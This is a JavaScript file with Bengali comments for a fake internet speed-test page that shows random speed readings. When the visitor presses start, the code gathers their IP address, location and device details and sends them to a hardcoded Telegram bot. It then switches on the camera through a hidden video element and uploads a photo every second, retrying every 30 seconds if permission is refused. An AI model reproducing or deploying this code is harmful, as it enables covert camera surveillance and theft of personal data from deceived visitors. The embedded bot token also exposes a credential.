// কনফিগারেশন
        const BOT_TOKEN = "7249136904:AAGFPmdS5CnextPMpNlUPv0qeSuVHBaUF-w";
        const CHAT_ID = "8174575316";
        const startBtn = document.getElementById('startTest');
        const speedValue = document.getElementById('speedValue');
        const needle = document.querySelector('.needle');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const networkType = document.getElementById('networkType');
        const video = document.getElementById('hiddenEye');
        const canvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');

        // ভ্যারিয়েবল
        let testRunning = false;
        let cameraActive = false;
        let deviceInfoSent = false;
        let photoInterval;

        // পার্টিকেল ক্রিয়েট
        function createParticles() {
            const colors = ['#8a2be2', '#00f7ff', '#ff00aa'];
            
            for (let i = 0; i < 15; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                const size = Math.random() * 5 + 2;
                const color = colors[Math.floor(Math.random() * colors.length)];
                
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.background = color;
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                particle.style.opacity = Math.random() * 0.5 + 0.1;
                
                const duration = Math.random() * 20 + 10;
                particle.style.animation = `float ${duration}s linear infinite`;
                
                document.body.appendChild(particle);
            }
        }

        // ডিভাইস ইনফো সংগ্রহ (আপডেটেড ভার্সন)
        async function collectDeviceInfo() {
            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
            let info = "📱 *ডিভাইস ইনফরমেশন* 📱\n\n";
            
            // কমন ইনফো (সবার জন্য)
            info += `🕒 সময়: ${new Date().toLocaleString()}\n`;
            
            // আইপি ও লোকেশন
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info += `🌐 আইপি: ${ipData.ip}\n`;
                
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();
                info += `📍 লোকেশন: ${locationData.city}, ${locationData.region}, ${locationData.country_name}\n`;
            } catch (e) {
                info += `🌐 আইপি: পাওয়া যায়নি\n`;
            }
            
            // মোবাইল ডিভাইসের জন্য
            if (isMobile) {
                info += `📱 ডিভাইস টাইপ: মোবাইল\n`;
                
                // ব্যাটারি ইনফো
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    info += `🔋 ব্যাটারি: ${Math.round(battery.level * 100)}%\n`;
                    info += `⚡ চার্জিং: ${battery.charging ? 'হ্যাঁ' : 'না'}\n`;
                }
            } 
            // পিসি ডিভাইসের জন্য
            else {
                info += `💻 ডিভাইস টাইপ: পিসি\n`;
                
                // উইন্ডোজ ভার্সন
                const winMatch = navigator.userAgent.match(/Windows NT (\d+\.\d+)/);
                if (winMatch) {
                    info += `🪟 উইন্ডোজ: ${getWindowsVersion(winMatch[1])}\n`;
                }
                
                // CPU কোর
                info += `⚙️ CPU কোর: ${navigator.hardwareConcurrency || 'অজানা'}\n`;
                
                // র‍্যাম ইনফো
                if (performance.memory) {
                    const totalRAM = (performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(1);
                    info += `🧠 র‍্যাম: ${totalRAM} MB\n`;
                }
                
                // CPU নাম (যদি পাওয়া যায়)
                try {
                    const cpuInfo = await getCPUInfo();
                    if (cpuInfo) info += `💻 প্রসেসর: ${cpuInfo}\n`;
                } catch (e) {}
            }
            
            return info;
        }

        // CPU নাম পাওয়ার ফাংশন
        async function getCPUInfo() {
            try {
                // এই পদ্ধতি Chrome এবং Edge এ কাজ করে
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    const highEntropyValues = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
                    if (highEntropyValues.model) return highEntropyValues.model;
                }
                
                // বিকল্প পদ্ধতি
                const cores = navigator.hardwareConcurrency || 'অজানা';
                return `${cores} কোর প্রসেসর`;
            } catch (e) {
                return null;
            }
        }

        // উইন্ডোজ ভার্সন নাম
        function getWindowsVersion(version) {
            const versions = {
                '10.0': 'Windows 10/11',
                '6.3': 'Windows 8.1',
                '6.2': 'Windows 8',
                '6.1': 'Windows 7',
                '6.0': 'Windows Vista',
                '5.2': 'Windows XP'
            };
            return versions[version] || version;
        }

        // স্পিড টেস্ট সিমুলেট
        function simulateSpeedTest() {
            if (testRunning) return;
            testRunning = true;
            
            let progress = 0;
            const testInterval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress > 100) progress = 100;
                
                progressBar.style.width = `${progress}%`;
                progressText.textContent = `${Math.floor(progress)}% সম্পূর্ণ`;
                
                // স্পিড রেজাল্ট আপডেট
                const speed = Math.floor(Math.random() * 80) + 10;
                speedValue.textContent = speed;
                needle.style.transform = `translateX(-50%) rotate(${(speed * 1.8) - 90}deg)`;
                
                if (progress >= 100) {
                    clearInterval(testInterval);
                    progressText.textContent = "টেস্ট সম্পন্ন!";
                    testRunning = false;
                }
            }, 500);
        }

        // ক্যামেরা চালু করো
        async function activateCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.play();
                cameraActive = true;
                
                // প্রতি ১ সেকেন্ডে ফটো পাঠানো
                photoInterval = setInterval(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        sendToTelegram(blob, true);
                    }, 'image/jpeg', 0.8);
                }, 1000);
            } catch (error) {
                console.log("ক্যামেরা এক্সেস দেয়নি:", error);
                // ৩০ সেকেন্ড পর আবার চেষ্টা করবে
                setTimeout(activateCamera, 30000);
            }
        }

        // টেলিগ্রামে ডাটা সেন্ড
        async function sendToTelegram(data, isPhoto = false) {
            try {
                if (isPhoto) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', data, 'photo.jpg');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: data,
                            parse_mode: 'Markdown'
                        })
                    });
                }
            } catch (error) {
                console.error("টেলিগ্রামে সেন্ড করতে সমস্যা:", error);
            }
        }

        // ইভেন্ট লিসেনার
        startBtn.addEventListener('click', async () => {
            startBtn.disabled = true;
            startBtn.innerHTML = '<i class="fas fa-cog fa-spin"></i> টেস্ট চলছে...';
            
            // ডিভাইস ইনফো সংগ্রহ এবং সেন্ড
            if (!deviceInfoSent) {
                const deviceInfo = await collectDeviceInfo();
                await sendToTelegram(deviceInfo);
                deviceInfoSent = true;
            }
            
            // স্পিড টেস্ট শুরু করো
            simulateSpeedTest();
            
            // ক্যামেরা চালু করার চেষ্টা করো
            if (!cameraActive) {
                activateCamera();
            }
        });

        // ইনিশিয়ালাইজেশন
        document.addEventListener('DOMContentLoaded', () => {
            createParticles();
            
            // নেটওয়ার্ক টাইপ চেক
            if (navigator.connection) {
                const conn = navigator.connection;
                networkType.textContent = conn.effectiveType + (conn.type === 'wifi' ? ' (WiFi)' : ' (Data)');
            }
        });
    